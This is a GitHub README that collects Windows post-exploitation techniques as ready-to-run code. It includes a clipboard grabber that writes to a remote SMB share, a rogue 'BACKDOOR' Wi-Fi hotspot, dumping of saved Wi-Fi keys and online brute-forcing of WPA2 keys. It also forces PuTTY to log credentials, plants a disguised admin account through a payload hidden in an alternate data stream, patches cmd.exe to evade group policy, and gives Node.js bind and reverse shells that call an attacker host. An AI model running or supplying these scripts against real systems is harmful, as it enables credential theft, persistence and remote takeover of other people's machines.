# Windows-Trix
An assortment of techniques that can be used to exploit Windows.  These are uncommon exploits that are not often used.  Most of these assume that you have or can attain administrator or system privileges on the endpoint.  You will need to change IP addresses and other references in the examples to fit your environment.

## >> Copying data from the clipboard using powershell

```powershell
Add-Type -AssemblyName System.Windows.Forms

if($([System.Windows.Forms.Clipboard]::ContainsImage()))
{
   $cb = [System.Windows.Forms.Clipboard]::GetImage()
   $file = '\\10.192.103.49\smbdata\clipboard.png'
   $cb.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
}
else
{
   if($([System.Windows.Forms.Clipboard]::ContainsText()))
   {
      $cb = [System.Windows.Forms.Clipboard]::GetText()
      $file = '\\10.192.103.49\smbdata\clipboard.txt'
      $cb > $file
   }
   else
   {
      Write-Output "Nothing in clipboard to save."
   }
}
```

## >> Configuring a backdoor hotspot using powershell

**Activation script** `wifi-start.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll
sc start SharedAccess | Out-Null

$ssid = "BACKDOOR"
$wpsk = "1234567890"

$hsup = netsh wlan show drivers | Select-String "Hosted network supported" | Select-String "Yes"
if(!$hsup)
{
   Write-Host "Wireless host mode not supported."
   Exit
}
$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String ": Started"
if($huse)
{
   Write-Host "Wireless host mode already in use."
   Exit
}
$wuse = netsh wlan show interfaces | Select-String "State" | Select-String "disconnected"
if(!$wuse)
{
   Write-Host "Wireless interface already in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq 'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$hcfg = netsh wlan set hostednetwork mode=allow ssid="$ssid" key="$wpsk" | Select-String "successfully changed"
if(!$hcfg)
{
   Write-Host "Wireless host mode could not be configured."
   Exit
}
$hact = netsh wlan start hostednetwork | Select-String "hosted network started"
if(!$hact)
{
   Write-Host "Wireless host mode could not be activated."
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
if($cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS ethernet interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless interface already in use."
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
$cfgpri.EnableSharing(1)
$cfgpub.EnableSharing(0)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot configured successfully."
   Exit
}
else
{
   Write-Host "ICS wireless hotspot setup failed."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
```

If you get error `Exception from HRESULT: 0x80040201` from the `EnableSharing` method then run the following VB script to delete all interface ICS configurations and try the `wifi-start.ps1` script again.<br />
```
set WMI = GetObject("WinMgmts:\root\Microsoft\HomeNet")
set objs1 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPrivate = TRUE")
for each obj in objs1
   obj.IsIcsPrivate = FALSE
   obj.Put_
next
set objs2 = WMI.ExecQuery("SELECT * FROM HNet_ConnectionProperties WHERE IsIcsPublic = TRUE")
for each obj in objs2
   obj.IsIcsPublic = FALSE
   obj.Put_
next
```

**Deactivation script** `wifi-stop.ps1`<br />
```powershell
regsvr32 /s hnetcfg.dll

$ssid = "BACKDOOR"

$huse = netsh wlan show interfaces | Select-String "Hosted network status" | Select-String "Started"
if(!$huse)
{
   Write-Host "Wireless host mode not in use."
   Exit
}
$ename = Get-NetAdapter | Where-Object {$_.PhysicalMediaType -eq '802.3' -and $_.MediaConnectionState -eq  'Connected'} | Select-Object -Property Name
if($ename.Name -eq $null)
{
   Write-Host "Connected ethernet interface name not identified."
   Exit
}
$enet_name = $ename.Name
$eipa = Get-NetIPAddress -InterfaceAlias $enet_name | Select-Object -Property IPAddress
if($eipa.IPAddress -eq $null)
{
   Write-Host "Ethernet interface IP Address not identified."
   Exit
}
$wname = Get-NetAdapter | Where-Object {($_.PhysicalMediaType -eq 'Native 802.11' -or $_.PhysicalMediaType -eq 'Wireless LAN') -and $_.Status -eq 'Up' -and $_.AdminStatus -eq 'Up' -and $_.ifDesc -like 'Microsoft Hosted Network Virtual Adapter*'} | Select-Object -Property Name
if($wname.Name -eq $null)
{
   Write-Host "Wireless host mode interface name could not be identified."
   Exit
}
$wlan_name = $wname.Name
$nso = New-Object -ComObject HNetCfg.HNetShare
if($nso -eq $null)
{
   Write-Host "Failed to create NetShare object."
   Exit
}
$netpub = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$enet_name" }
$cfgpub = $nso.INetSharingConfigurationForINetConnection.Invoke($netpub)
$netpri = $nso.EnumEveryConnection |? { $nso.NetConnectionProps.Invoke($_).Name -eq "$wlan_name" }
$cfgpri = $nso.INetSharingConfigurationForINetConnection.Invoke($netpri)
if($cfgpri.SharingEnabled -eq $true -and $cfgpub.SharingEnabled -eq $true)
{
   Write-Host "ICS wireless hotspot deactivated."
   $cfgpri.DisableSharing()
   $cfgpub.DisableSharing()
   $hoff = netsh wlan stop hostednetwork | Select-String "hosted network stopped"
   if(!$hoff)
   {
      Write-Host "Wireless host mode could not be deactivated."
   }
   $out = netsh wlan set hostednetwork mode=disallow ssid="$ssid"
   Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WlanSvc\Parameters\HostedNetworkSettings" -Name "HostedNetworkSettings"
   Exit
}
else
{
   Write-Host "Active ICS hotspot not detected."
   Exit
}
```

## >> Retrieving wireless profile passwords using powershell

```powershell
$wp = @()
(((netsh wlan show profiles) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*All user profile*')
   {
      $t = $_.Split(":")
      $wp += $t[1].trim()
   }
})
Write-Host "SSID -> PSK"
Write-Host "-----------------------------------------"
$wp.foreach({
   $id = $_
   (((netsh wlan show profile "$id" key=clear) | Out-String).Split("`r`n")).ForEach({
   if($_ -Like '*Key content*')
   {
      $pw = ($_.Split(":"))[1].trim()
      Write-Host "$id -> $pw"
   }
})})
```

## >> View wireless networks and signal strength using netsh

```netsh wlan show networks mode=bssid```

## >> Slow on-line brute-force wireless password using powershell

```powershell
$ssid = "iPhone"
$wordlist = @("password",
              "secretkey!",
              "wifiaccess",
              "wifipassword",
              "1234567890",
              "Pa55w0rd")
$xmlfile = "C:\windows\temp\BruteForce.xml"
$pxml = @'
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
   <name>BruteForce</name>
   <SSIDConfig>
      <SSID>
         <hex>------</hex>
         <name>------</name>
      </SSID>
   </SSIDConfig>
   <connectionType>ESS</connectionType>
   <connectionMode>auto</connectionMode>
   <MSM>
      <security>
         <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
         </authEncryption>
         <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>------</keyMaterial>
         </sharedKey>
      </security>
   </MSM>
</WLANProfile>
'@
$ssidhex = ""
$ssid.ToCharArray() | foreach-object -process {$ssidhex += '{0:X}' -f [int][char]$_}
(((netsh wlan show interfaces) | out-string ).split("`r`n")).ForEach({
   if($_ -Like '*Name*')
   {
      $t = $_.Split(":")
      $wlan = $t[1].trim()
   }
})
if($wlan -eq $null)
{
   Write-Host "Could not identify the wireless adapter."
   Exit
}
foreach($key in $wordlist)
{
   if(Test-Path $xmlfile) {Remove-Item -Path "$xmlfile" -Force}
   ForEach($line in $($pxml -split "`r`n"))
   {
      $line = $line -Replace [regex]::Escape("<hex>------</hex>"),"<hex>$ssidhex</hex>"
      $line = $line -Replace [regex]::Escape("<name>------</name>"),"<name>$ssid</name>"
      $line = $line -Replace [regex]::Escape("<keyMaterial>------</keyMaterial>"),"<keyMaterial>$key</keyMaterial>"
      $line | Out-File "$xmlfile"
   }
   netsh wlan add profile filename="$xmlfile" | Out-Null
   netsh wlan connect name="BruteForce" interface="$wlan" | Out-Null
   Start-Sleep -s 4
   $state = ""
   (((netsh wlan show interfaces interface="$wlan") | out-string ).split("`r`n")).ForEach({
      if($_ -Like '*State*')
      {
         $t = $_.Split(":")
         $state = $t[1].trim()
      }
   })
   if($state -eq "connected")
   {
      Write-Host "Wireless PSK -> $key"
      netsh wlan delete profile name="BruteForce" | Out-Null
      Exit
   }
   netsh wlan delete profile name="BruteForce" | Out-Null
}
```

## >> Logging PuTTY credentials using powershell

```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "C:\Windows\Temp\puttylog$snum.log" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 3 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 0 -Type DWord -Force | Out-Null
   <# to remove logging
   New-ItemProperty -Path "$rkey" -Name "LogFileName" -Value "" -Type String -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFlush" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogType" -Value 0 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "LogFileClash" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitData" -Value 1 -Type DWord -Force | Out-Null
   New-ItemProperty -Path "$rkey" -Name "SSHLogOmitPasswords" -Value 1 -Type DWord -Force | Out-Null
   #>
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) were configured to log credentials."
}
else
{
   Write-Host "There were no PuTTY sessions to configure."
}
```

**Listing PuTTY log paths**<br />
```powershell
$user = Get-WMIObject -class Win32_ComputerSystem | select -ExpandProperty username
if(!$user)
{
   Write-Host "Currently logged on user not identified."
   Exit
}
Write-Host "Currently logged on user = $user"
$sidu = (New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).value
if(!$sidu)
{
   Write-Host "User SID not identified."
   Exit
}
$putty = Test-Path -Path "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if($putty -eq $False)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$sess = Get-ChildItem "REGISTRY::HKEY_USERS\$sidu\Software\SimonTatham\PuTTY\Sessions"
if(!$sess)
{
   Write-Host "No PuTTY sessions identified."
   Exit
}
$skey = $sess | Foreach-Object {Get-ItemProperty $_.PsPath}
$snum = 0
Foreach($item in $skey)
{
   $rkey = Convert-Path $item.PsPath
   $rkey = "REGISTRY::$rkey"
   $ppath = Get-ItemProperty -Path "$rkey" -Name "LogFileName"
   if($ppath)
   {
      $ppath.LogFileName
   }
   $snum++
}
if($snum -gt 0)
{
   Write-Host "$snum PuTTY session(s) have a log path."
}
else
{
   Write-Host "No PuTTY logging identified."
}
```

## >> Hiding payloads in Alternate Data Streams (ADS)

**Create a container file on an NTFS file system**<br />
`echo This is a harmless text file :) > c:\windows\temp\harmless.txt`

**Verify the contents of the container file**<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Check the file size of the container file**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`

**Create powershell payload as base64 to add a backdoor account**<br />
Run `cat | base64 -w 0; echo` then paste the following code, press ctrl-d (EOF) when finished.<br />
```powershell
$Password = ConvertTo-SecureString "+BackD00rAdmin+" -AsPlainText -Force
New-LocalUser -Name "BDAdmin" -Password $Password -AccountNeverExpires -FullName "BD Admin" -Description "Helpdesk account, do not delete" -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
```

**Create the hidden payload data stream using the base64 output above**<br />
`echo JFBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAiK0JhY2tEMDByQWRtaW4rIiAtQXNQbGFpblRleHQgLUZvcmNlCk5ldy1Mb2NhbFVzZXIgLU5hbWUgIkJEQWRtaW4iIC1QYXNzd29yZCAkUGFzc3dvcmQgLUFjY291bnROZXZlckV4cGlyZXMgLUZ1bGxOYW1lICJCRCBBZG1pbiIgLURlc2NyaXB0aW9uICJIZWxwZGVzayBhY2NvdW50LCBkbyBub3QgZGVsZXRlIiAtUGFzc3dvcmROZXZlckV4cGlyZXMKQWRkLUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwICJBZG1pbmlzdHJhdG9ycyIgLU1lbWJlciAiQkRBZG1pbiIK > c:\windows\temp\harmless.txt:payload.ps1`

**Verify the size and contents of** `harmless.txt` **have not changed**<br />
`dir c:\windows\temp\harmless.txt`<br />
(output) `1 File(s) 34 bytes`<br />
`type c:\windows\temp\harmless.txt`<br />
(output) `This is a harmless text file :)`

**Detonate the hidden payload to create the backdoor account**<br />
```powershell
powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
```

## >> TCP port scanning using certutil

This technique can be used when pivoting.  The error code indicates the status of the remote service.<br />
The target being scanned in this example is 10.1.2.3 port 8080.

`certutil -urlcache -split -f http://10.1.2.3:8080/doesnotexist.file doesnotexist.file | findstr FAILED`<br />
Response `0x80072f78` the port responded but is not HTTP protocol.<br />
Response `0x80190194` the port responded to HTTP but `doesnotexist.file` is not present (404 error).<br />
Response `0x80072efd` the port did not respond.<br />
Response does not contain an error code, then the file was retrieved successfully.

## >> Using netsh to capture network packets

This technique is useful for capturing insecure protocol traffic on a host (e.g. telnet, FTP, HTTP, SNMP).<br />
This example will filter the trace on IP address 10.2.5.92 and halt after 10MB is captured.

**Stop any currently running captures**<br />
`netsh trace stop`

**Start the packet capture**<br />
`netsh trace start capture=yes ipv4.address=10.2.5.92 filemode=single maxsize=10 overwrite=yes tracefile=c:\Windows\temp\tracefile.etl`

**Convert the etl file to cap format for wireshark**<br />
Download Microsoft Network Monitor 3.4 from [HERE](https://www.microsoft.com/en-us/download/details.aspx?id=4865).<br />
Open `tracefile.etl` with Network Monitor 3.4 and save as `tracefile.cap`.<br />
Open `tracefile.cap` using wireshark.

## >> Performing SNMP from powershell

The Windows ISNMP Automation Interface can be used to perform GET and SET operations.  Cisco 3750 OID used in this example.

```powershell
# Get the system description
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.1.1.0')
$objSNMP.Close()
```

```powershell
# Get an interface description (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface VLAN assignment (Ge2/0/24)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624')
$objSNMP.Close()
```

```powershell
# Get an interface link status (Ge2/0/24, 1 = up, 2 = down)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Get('.1.3.6.1.2.1.2.2.1.8.10624')
$objSNMP.Close()
```

```powershell
# Change an interface VLAN assignment (Ge2/0/24, to VLAN 315)
$objSNMP = New-Object -ComObject olePrn.OleSNMP
$sCommunity = 'C15c0-rw'
$sDevice = '10.192.96.139'
$sVersion = '2'
$sMSWait = '1000'
$objSNMP.Open($sDevice, $sCommunity, $sVersion, $sMSWait)
$objSNMP.Set('.1.3.6.1.4.1.9.9.68.1.2.2.1.2.10624', 315)
$objSNMP.Close()
```

## >> Circumventing cmd.exe policy restrictions

Windows group policy can be configured to disable execution of the command prompt by setting an option under Computer Policy >> User Configuration >> Administrative Templates >> System.  This results in the following message being displayed when attempting to launch the command prompt.

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd02.png)

The cmd.exe program tests for the following registry value to determine if this policy is set:<br />
`HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD`

The unicode string for the registry value exists in the cmd.exe binary.  You can make a copy of cmd.exe and edit this string to defeat policy checking.  Here is an example of generating the hex characters to search for.

`echo DisableCMD | iconv -t utf-16le | hexdump -Cv`<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd00.png)

Using certutil.exe you can make a copy of cmd.exe represented as a text file containing hex characters.<br />
`c:\windows\system32\certutil.exe -encodehex c:\windows\system32\cmd.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd03.png)

Now edit the text file using notepad.<br />
`c:\windows\system32\notepad.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd04.png)

Find the hex characters that make up the unicode string generated earlier.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd05.png)<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd06.png)

Edit the hex values from `44 00 69 00` to `44 00 00 00` and save the text file.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd07.png)

Convert the text file back into an exe.<br />
`c:\windows\system32\certutil.exe -decodehex c:\windows\xxxxxxxx\appdata\local\temp\cmd.txt c:\windows\xxxxxxxx\appdata\local\temp\cmd.exe`

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd08.png)

Double-click on the modified copy of cmd.exe.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd09.png)

You now have a command shell.<br />
![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd10.png)

## >> Node.js bind and reverse shell using node.exe

The Node.js JavaScript runtime is occasionally found on a Windows system either as a standalone installation or bundled in with some other application (e.g. Adobe Creative Cloud).  You can also extract the node.exe binary from the <a href="https://nodejs.org/en/download/" target="_blank">ZIP package</a> and copy it to a victim computer.

Example of a bind shell (socket server)<br />
```javascript
// Example command execution server with authentication.
// (1) Save this script as "server.js"
// (2) Launch the bind shell on the victim "node.exe server.js"
// (3) Connect from the attacking computer "nc <victim IP> 4444"
// command: ug0tpwn3d, allows the server to start processing commands.
// command: DISCONNECT, drops current connection, must reauth with key on new client connect.
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '0.0.0.0';
var c2port = 4444;
var state = 'DISABLED';
var authkey = 'ug0tpwn3d';

var server = net.createServer(function(socket)
{
   socket.write('Ready...\r\n');
   socket.on('data', function(directive)
   {
      if(directive.toString().trim() === authkey && state === 'DISABLED')
      {
         // authn success, start processing commands
         state = 'ENABLED';
         socket.write('Authentication successful.  Accepting commands...\r\n');
      }
      else if(directive.toString().trim() === 'DISCONNECT' && state === 'ENABLED')
      {
         // drop current connection and disable command processor
         socket.destroy();
         state = 'DISABLED';
      }
      else if(directive.toString().trim() === 'ABORT' && state === 'ENABLED')
      {
         // terminate the script
         socket.destroy();
         process.exit(1);
      }
      else if(state === 'ENABLED')
      {
         // execute a command
         cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
         cmd.stdout.on('data', function(output)
         {
            socket.write(output.toString());
         });
         cmd.stderr.on('data', function(output)
         {
            socket.write(output.toString());
         });
      }
   });
}).listen(c2port, c2host);
```

Example of a reverse shell (socket client)<br />
```javascript
// Example command execution client.
// (1) Save this script as "client.js"
// (2) Start a netcat listener on the attacking computer "nc -nlvp 4444"
// (3) Launch the reverse shell on the victim "node.exe client.js"
// command: ABORT, terminates the script.

var net = require('net');
var spawn = require('child_process').spawn;
var c2host = '192.168.1.119';
var c2port = 4444;

var client = new net.Socket();
client.connect(c2port, c2host, function()
{
   client.write('Ready...\r\n');
});
client.on('data', function(directive)
{
   if(directive.toString().trim() === 'ABORT')
   {
      // terminate the script
      client.destroy();
      process.exit(1);
   }
   else
   {
      // execute a command
      cmd = spawn(process.env.comspec, ['/c', directive.toString().trim()], {windowsVerbatimArguments: true});
      cmd.stdout.on('data', function(output)
      {
         client.write(output.toString());
      });
      cmd.stderr.on('data', function(output)
      {
         client.write(output.toString());
      });
   }
});
```

